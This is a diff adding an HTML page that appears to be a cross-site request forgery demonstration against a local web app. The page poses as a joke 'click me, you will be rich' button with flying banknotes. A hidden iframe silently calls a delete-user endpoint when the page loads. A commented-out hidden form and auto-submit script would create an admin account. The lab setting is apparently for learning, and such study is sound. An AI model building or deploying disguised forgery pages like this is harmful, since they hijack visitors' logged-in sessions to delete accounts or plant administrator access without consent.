@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Money</title>
+    <style>
+        .money {
+            position: absolute;
+            width: 400px;
+            height: 250px;
+            background-image: url('https://png.pngtree.com/png-clipart/20231206/original/pngtree-vietnamese-currency-500-000-dong-banknote-currency-photo-png-image_13786178.png');
+            background-size: cover;
+            animation: explode 2s ease-out forwards;
+        }
+
+        @keyframes explode {
+            0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+
+            100% {
+                transform: translate(var(--x), var(--y)) scale(0.5);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <button onclick="fireMoney()">Click me!! You will be rick</button>
+    <iframe style="display: none;" src="http://localhost:8080/delete_user.php?id=28"></iframe>
+
+    <!--<form action="http://localhost:8080/form_user.php" method="POST" name="form1">-->
+    <!--    <input type="hidden" name="name" value="Ronaldo">-->
+    <!--    <input type="hidden" name="password" value="matkhau123">-->
+    <!--    <input type="hidden" name="fullname" value="CR7">-->
+    <!--    <input type="hidden" name="type" value="admin">-->
+    <!--    <input type="hidden" name="submit" value="submit">-->
+    <!--</form>-->
+
+    <script>
+        function fireMoney() {
+            const centerX = window.innerWidth / 2;
+            const centerY = window.innerHeight / 2;
+
+            for (let i = 0; i < 20; i++) {
+                const angle = Math.random() * 2 * Math.PI;
+                const distance = 300 + Math.random() * 100;
+                const x = Math.cos(angle) * distance + 'px';
+                const y = Math.sin(angle) * distance + 'px';
+
+                const money = document.createElement('div');
+                money.className = 'money';
+                money.style.left = (centerX - 200) + 'px';
+                money.style.top = (centerY - 125) + 'px';
+                money.style.setProperty('--x', x);
+                money.style.setProperty('--y', y);
+
+                document.body.appendChild(money);
+
+                setTimeout(() => {
+                    money.remove();
+                }, 2000);
+            }
+        }
+
+        // setTimeout(() => {
+        //     HTMLFormElement.prototype.submit.call(document.forms['form1']);
+        // }, 1000);
+    </script>
+
+</body>
+
+</html>
